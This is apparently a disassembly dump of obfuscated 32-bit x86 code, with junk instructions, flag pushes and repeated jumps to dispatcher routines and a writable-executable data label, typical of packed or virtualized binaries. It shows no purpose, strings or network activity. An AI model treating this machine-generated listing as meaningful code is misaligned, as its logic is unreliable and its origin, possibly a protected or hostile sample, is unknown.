shld cx cx cl
mov al [ esi ]
pushfd
shr cx 0x2
and ecx eax
xor al bl
ror ch cl
ror al 0x2
jmp sub_51839a
sub_51a596
test bh cl
and [ ebp + 0x4 ] ax
push [ esp + 0x4 ]
pushfd
pop [ esp + 0x18 ]
push [ esp ]
push [ esp + 0x1c ]
pop [ ebp ]
pushfd
pushad
push eax
lea esp [ esp + 0x48 ]
jmp sub_518895
sub_51a5bb
mov al [ ss : edx ]
mov [ esp + 0x4 ] 0x1c1b2f59
pushfd
mov [ ebp ] ax
mov [ esp + 0x8 ] bh
push [ esp ]
lea esp [ esp + 0x18 ]
jmp rwxdata
shld cx cx cl
mov al [ esi ]
pushfd
shr cx 0x2
and ecx eax
xor al bl
ror ch cl
ror al 0x2
jmp sub_51839a
sub_51a5fd
mov [ esp + 0x2c ] edi
push 0x77cb8179
push 0xf0ea3bb1
mov [ esp + 0x30 ] edx
mov [ esp + 0x4 ] ch
mov [ esp + 0x2c ] esi
movzx si cl
mov [ esp + 0x4 ] 0x5168
mov [ esp + 0x4 ] sp
mov [ esp + 0x28 ] eax
lea esi [ ebp * 8 + 0x70e47422 ]
pushfd
movzx si bl
mov [ esp + 0x28 ] ebx
jmp rwxdata
pushfd
pop [ esp + 0x24 ]
jmp rwxdata
pushfd
movsx si cl
call sub_518b98
pushfd
jmp rwxdata
jmp rwxdata
xchg [ esp + 0x48 ] esi
call sub_519089
sub_4ba009
pushfd
mov [ esp + 0x44 ] eax
pushfd
push [ esp + 0x48 ]
retn 0x4c
sub_4ba263
pushad
mov [ esp ] 0x2
call sub_4cff38
sub_4ba55b
push ebp
pushad
call sub_4bab1c
sub_4ba5ea
neg bh
not cl
mov ecx [ esi + 0x4 ]
bts di 0x8
sub ecx 0x8
sar di 0x2
not di
call sub_515597
sub_4ba7ec
mov [ esp ] 0xb04f
mov ebp [ esp + 0x4 ]
mov [ esp ] al
pushad
push ecx
push [ esp + 0x2c ]
retn 0x30
sub_4ccec1
call sub_514c3b
add [ ecx - 0x4fde68ca ] ch
and esp [ eax - 0x603471cf ]
or eax 0x85129b7c
into
sbb ebx [ ebp + ebx + 0xd ]
jmp 0xffffffffb0a7b558
sub_4cd0f5
sub esp 0xfffffff8
jno rwxdata
clc
cmp bh ah
cmp ah 0x5
pushad
push [ esp ]
call sub_4cd107
cmp ah 0x5
push ecx
call sub_516390
sub_4cfe36
mov esp ebp
call sub_4ba7ec
call sub_4ba55b
sub_4cfe42
pushfd
pushfd
jmp rwxdata
lea esp [ esp + 0xc ]
call j_sub_51680a
stc
cmp eax 0x7d00
pushfd
jmp sub_515ce9
j_sub_4ba3bf
jmp sub_4ba3bf
sub_4cff38
shr ebx 0xc
bt bx 0x5
cmp ebx 0x1
call sub_515950
sti
cmp al bh
mov ebx eax
mov ecx 0xb7f89177
mov [ esi - 0x549c7866 ] edx
xchg edx eax
mov ecx [ ebx * 2 + 0x3cfc90e3 ]
j_sub_517148
jmp sub_517148
sub_514f4a
call sub_4cfe87
clc
cmp bh ah
cmp ah 0x5
pushad
push [ esp ]
call sub_4cd107
sub_514f5e
pushfd
cmc
stc
and eax 0xffff
push 0x125dd795
lea esp [ esp + 0xc ]
jmp rwxdata
call sub_514bac
sub_5155d0
cmc
jmp rwxdata
pushad
add eax 0x2
test ch 0x67
add eax ebx
lea esp [ esp + 0x24 ]
call sub_514bac
sub_51578e
sub esi eax
jmp sub_4cd049
sub_515809
mov edi [ esp + 0x8 ]
call sub_516f7b
sub_515df3
mov [ esp + 0x2c ] eax
pushfd
mov [ esp ] 0x6610
pushfd
push 0x841c6401
push [ esp + 0x38 ]
retn 0x3c
j_sub_4cfe36
jmp sub_4cfe36
sub_5160ed
pushfd
mov esi [ esp + 0x14 ]
movsx ebp cl
mov ebp [ esp + 0x18 ]
push 0x6a2e1006
pushfd
push 0x3f55786f
push [ esp ]
push [ esp + 0x2c ]
retn 0x30
sub_516182
jmp 0xffffffffa5f1e721
sub_51642b
call sub_515f5a
j_sub_5156a9
jmp sub_5156a9
_start
push 0x9ec027ae
call sub_518563
sub_5164ce
not eax
aam 0x48
or bl 0xa
mov eax ebp
or bl 0xaf
mov bl 0x1
jmp sub_515e80
sub_51680a
bt bp dx
bt bp 0xb
cmc
xor ecx ecx
sub_516816
pushad
inc ecx
lea esp [ esp + 0x20 ]
push 0xbec177bb
pushfd
pushfd
pushfd
lea esp [ esp + 0x10 ]
call sub_514aff
call sub_51499f
jmp sub_5158f7
sub_516af7
call sub_515809
sub_516b27
test esi esi
jmp sub_4ba0a3
sub_518018
pushfd
call sub_5189e7
sub_518034
push 0xc18c9d46
jmp rwxdata
mov ebp [ ebp ]
pushfd
push 0x2f8b9539
mov [ esp + 0x4 ] cx
push ebp
lea esp [ esp + 0x14 ]
jmp sub_518895
sub_518082
mov [ esp ] edi
jmp sub_519e68
sub_51808a
push ecx
jmp rwxdata
call sub_5181d3
sub_5180cb
mov [ esp ] ax
mov [ ebp ] eax
mov [ esp + 0x4 ] bh
lea esp [ esp + 0x40 ]
jmp sub_518895
sub_51811a
pushad
call sub_518622
push 0xe583a66b
call sub_518354
sub_51812a
push [ esp + 0x28 ]
pop [ ebp ]
mov [ esp ] bl
pushfd
mov [ esp ] di
mov [ esp + 0x4 ] dl
lea esp [ esp + 0x30 ]
jmp sub_518895
sub_518219
pushad
mov [ esp + 0x40 ] edx
push [ esp + 0x4 ]
mov [ esp + 0x8 ] 0x91
push ecx
xchg [ esp + 0x44 ] esi
call sub_5183bc
sub_518231
mov [ esp + 0x4 ] 0x18
push [ esp ]
mov [ esp + 0x40 ] edi
pushfd
call sub_51914f
call sub_518034
sub_5182c0
pushad
pushad
mov [ esp + 0x3c ] ebp
jmp rwxdata
mov [ esp + 0x38 ] ecx
call sub_51a15a
sub_518340
cmp ax 0x96b7
sub ax 0xe6ff
stc
bt ecx ebx
xor bx ax
jmp sub_5187e9
sub_518371
push ebx
add ecx 0x0
mov [ esp + 0x4 ] 0x2efb
jmp rwxdata
pushfd
push 0xf52f632e
mov [ esp + 0x4c ] ecx
push [ esp ]
mov [ esp + 0x4 ] 0x5e
push [ esp + 0x50 ]
retn 0x54
sub_51839a
dec ch
dec al
cmc
not al
cmc
neg al
btc cx sp
lea ecx [ esi + 0x1249c05e ]
bts ecx 0xc
cmp ah 0x8e
xor bl al
jmp sub_518f2a
sub_5183bc
mov [ esp + 0x44 ] eax
call sub_519bd4
j_sub_51893f
jmp sub_51893f
sub_5183e2
push 0x84229d11
mov [ esp ] ebp
call sub_51a1e9
sub_518502
xor ax bx
pushfd
pushad
jmp rwxdata
rol ax 0x2
call sub_51958d
sub_518520
mov [ esp + 0x24 ] 0x0
bswap si
mov [ esp ] cx
mov esi [ esp + 0x50 ]
mov [ esp + 0x4 ] 0x97
lea esp [ esp + 0x24 ]
jmp sub_518e7a
sub_518563
pushfd
mov [ esp ] ebp
push 0xf138911f
push [ esp ]
call sub_51946a
sub_518574
pushfd
pushfd
mov [ esp + 0x14 ] ecx
push 0xc54b9fea
pushad
push [ esp + 0x38 ]
retn 0x3c
sub_5185d5
sub ebp 0x4
call sub_5180cb
sub_5185dd
mov [ ebp ] ax
push [ esp ]
pushad
push 0x9146cebb
push eax
lea esp [ esp + 0x48 ]
jmp sub_518895
sub_518622
push [ esp + 0x48 ]
pop [ ebp ]
pushfd
mov [ esp ] 0xfe73
mov [ esp ] bh
lea esp [ esp + 0x50 ]
jmp sub_518895
sub_51868d
push [ esp + 0x4 ]
pushfd
pop [ esp + 0x40 ]
jmp rwxdata
mov [ esp + 0x4 ] 0xf276
push [ esp + 0x40 ]
pop [ ebp ]
pushfd
push edi
mov [ esp ] 0x2c
lea esp [ esp + 0x4c ]
jmp sub_518895
j_sub_5194cb
jmp sub_5194cb
sub_5186f3
movsx bp al
not ecx
mov ecx [ esp + 0x28 ]
pop ebp
mov ebp [ esp + 0x28 ]
pushfd
push 0x5108c83e
mov [ esp + 0x4 ] al
push edx
push [ esp + 0x38 ]
retn 0x3c
sub_518791
push esi
pushfd
pushfd
sub ebp 0x4
pushad
jmp rwxdata
mov [ ebp ] eax
pushfd
push [ esp + 0x4 ]
lea esp [ esp + 0x4c ]
jmp sub_518895
sub_5187e9
push 0xdfe94eea
push 0xf6ed435c
mov [ esp + 0x4 ] ah
sub ebp 0x2
jmp rwxdata
mov [ ebp ] ax
push esp
pushfd
push [ esp ]
lea esp [ esp + 0x4c ]
jmp sub_518895
sub_518867
bswap si
mov [ esp + 0x28 ] edi
movzx si bl
bswap esi
mov [ esp + 0x24 ] 0x0
mov [ esp ] 0x65b
mov esi [ esp + 0x50 ]
pushad
push 0x538d0235
lea esp [ esp + 0x48 ]
jmp sub_518e7a
j_sub_518595
jmp sub_518595
sub_51892f
pushfd
mov di si
mov esp eax
call sub_519e06
jmp rwxdata
mov [ esp ] ecx
jmp sub_519ac1
j_sub_518f8f
jmp sub_518f8f
sub_518a78
sbb cl 0x36
mov cl [ ebp + 0x4 ]
push [ esp ]
stc
sub ebp 0x2
cmc
clc
shr eax cl
call sub_519456
sub_518a8e
call sub_519faa
mov [ ebp + 0x4 ] eax
call j_sub_518b7a
sub_518a9b
push [ esp + 0x18 ]
jmp rwxdata
push [ esp + 0x44 ]
pop [ ebp ]
push 0x783f4cce
mov [ esp + 0xc ] dl
lea esp [ esp + 0x4c ]
jmp sub_518895
sub_518b3b
pushfd
inc eax
stc
rol eax 0x9
call sub_519be0
sub_518b46
mov [ ebp + 0x4 ] eax
mov [ esp + 0x4 ] edx
push [ esp + 0x4 ]
push [ esp ]
pushfd
pop [ esp + 0x34 ]
pushfd
pushfd
call sub_5186e2
j_sub_51a09d
jmp sub_51a09d
sub_518b65
push edi
call sub_51a41f
sub_518b6b
sub ebp 0x2
push [ esp ]
mov [ esp ] di
jmp rwxdata
mov [ ebp ] ax
push edx
lea esp [ esp + 0xc ]
jmp sub_518895
sub_518b8c
mov [ esp + 0x34 ] ebx
not si
call sub_519341
sub_518b98
mov [ esp + 0x28 ] edi
call sub_519baf
sub_518bd5
push esi
xor eax 0xc0503a94
test ah bl
cmc
add ebx eax
stc
mov [ esp ] 0x4c
call sub_5185d5
mov [ esp ] ecx
jmp sub_519ac1
sub_518d7b
mov [ esp + 0xc ] 0x6a
jmp rwxdata
pushad
dec [ ebp ]
call sub_519643
sub_518de7
pushfd
mov [ esp + 0x4 ] ebp
mov [ esp ] ah
jmp rwxdata
mov [ esp ] cl
mov [ esp ] ecx
call j_sub_518595
sub_518f2a
push 0x4eed89a0
and cl al
dec cl
add esi 0x1
lea ecx [ edx * 4 + 0x53fbc54d ]
jmp sub_518384
sub_518f42
call sub_518248
sub_518f89
pushad
jmp rwxdata
pushad
pushfd
pop [ esp + 0x3c ]
call sub_518a9b
sub_518fc2
pushad
push eax
mov [ esp + 0x2c ] edx
pushfd
xchg [ esp + 0x2c ] esi
movsx si cl
movsx si bl
jmp rwxdata
mov [ esp + 0x28 ] eax
movzx si cl
call sub_5193e2
sub_519048
call sub_519f1c
sub_519089
mov [ esp + 0x48 ] eax
jmp rwxdata
pushfd
mov [ esp + 0x48 ] ebx
mov [ esp ] esi
mov [ esp + 0xc ] edx
pushfd
pop [ esp + 0x44 ]
call sub_518495
sub_5190ab
mov esi [ esp + 0x44 ]
push [ esp ]
push [ esp + 0x10 ]
push 0x45cfcd16
push 0x655e961c
lea esp [ esp + 0x28 ]
jmp sub_518e7a
sub_51911d
mov esi [ esp + 0x64 ]
pushfd
push 0x3c7012d
pushfd
lea esp [ esp + 0x44 ]
jmp sub_518e7a
sub_51914f
mov [ esp + 0x44 ] edx
jmp sub_518f42
sub_51916e
bswap cx
push 0x269256c
mov ecx [ eax * 4 + rwxdata ]
call j_sub_519d95
sub_51919e
lea esi [ ebp - 0x2470f184 ]
jmp sub_51a4de
j_sub_519446
jmp sub_519446
sub_519446
movsx esi dl
mov [ esp + 0x34 ] 0x0
call sub_51911d
sub_519465
call sub_51916e
sub_51946a
mov [ esp + 0x8 ] ecx
pushad
pushfd
call sub_51a5fd
j_sub_518b7a
jmp sub_518b7a
sub_51958d
call sub_518807
sub_519a84
mov [ ebp ] eax
push 0xcff5807e
mov [ esp + 0x4 ] dh
mov [ esp ] cl
mov [ esp ] 0xf74ec653
lea esp [ esp + 0x50 ]
jmp sub_518895
sub_519ac1
call sub_51922f
sub_519b1e
pushad
add ecx 0x0
push [ esp + 0x4 ]
mov [ esp + 0x44 ] ecx
push [ esp + 0x10 ]
mov [ esp + 0x8 ] 0xc5
push [ esp + 0x48 ]
retn 0x4c
sub_519baf
mov [ esp + 0x28 ] 0x0
not esi
mov esi [ esp + 0x54 ]
mov [ esp ] si
push 0x4de68866
mov [ esp + 0x8 ] ch
pushfd
lea esp [ esp + 0x30 ]
jmp sub_518e7a
sub_519bd4
lea esi [ esp + 0x6bceac3a ]
call sub_51a4f8
sub_519c32
mov [ esp + 0x8 ] ecx
jmp sub_518aa4
sub_519c3b
mov esi [ esp + 0x68 ]
mov [ esp ] cl
lea esp [ esp + 0x3c ]
jmp sub_518e7a
sub_519c95
mov [ esp + 0x38 ] 0x0
push eax
push esp
bswap si
mov esi [ esp + 0x6c ]
pushfd
mov [ esp + 0x8 ] 0xf242
lea esp [ esp + 0x44 ]
jmp sub_518e7a
sub_519d26
push [ esp + 0x8 ]
mov [ esp + 0x2c ] esi
pop esi
mov [ esp ] edi
movsx si dl
mov [ esp + 0x24 ] eax
jmp sub_518e17
j_sub_519d95
jmp sub_519d95
sub_519e68
push edx
push 0xfcb0cfd4
mov [ esp ] 0x61
xchg [ esp ] esi
movsx si al
push eax
bswap si
call sub_51a115
sub_519e82
push [ esp + 0x10 ]
pop [ ebp ]
pushad
mov [ esp ] 0x30ed
pushfd
mov [ esp ] 0x3b
lea esp [ esp + 0x38 ]
jmp sub_518895
sub_519f1c
mov [ esp ] 0x20
jmp sub_518de7
sub_519faa
mov [ esp + 0x44 ] 0x0
mov [ esp ] ax
push [ esp ]
pop esi
pushfd
mov esi [ esp + 0x74 ]
mov [ esp + 0x8 ] ax
lea esp [ esp + 0x48 ]
jmp sub_518e7a
sub_519ff1
pop esi
pushfd
pop [ esp + 0x38 ]
movzx esi al
mov [ esp + 0x34 ] edi
pushfd
jmp j_sub_519446
sub_51a09d
mov [ esp + 0x4 ] al
pushfd
pop [ esp + 0x50 ]
mov [ esp + 0x8 ] cx
push [ esp + 0x50 ]
pop [ ebp ]
mov [ esp ] al
mov [ esp ] ax
mov [ esp ] bp
lea esp [ esp + 0x54 ]
jmp sub_518895
sub_51a10b
pushfd
stc
sub ebp 0x2
call sub_51a431
sub_51a15a
call sub_518231
pushfd
movsx si cl
call sub_518b98
pushfd
jmp rwxdata
jmp rwxdata
xchg [ esp + 0x48 ] esi
call sub_519089
sub_51a1e9
mov [ esp ] ecx
push 0xca6f29fd
call sub_5183ef
sub_51a279
shrd eax edx cl
mov [ esp + 0x4 ] ch
call sub_518b46
sub_51a41f
call sub_519e82
mov [ esp + 0x24 ] edx
push [ esp + 0x14 ]
call sub_519d26
j_sub_51a10b
jmp sub_51a10b
sub_51a4f8
mov [ esp + 0x48 ] ebx
lea esi [ ecx * 8 + 0x5078c778 ]
call sub_518dc4
sub_51a508
pushfd
pop [ esp + 0x4 ]
pushad
call sub_51812a
pushad
dec [ ebp ]
call sub_519643
sub_51a5db
call sub_5190c9
call j_sub_51a09d
sub ebp 0x2
cmp bl ah
cmp bh 0x42
shl ax cl
pushad
push esp
pushfd
push edi
mov [ ebp + 0x4 ] ax
jmp rwxdata
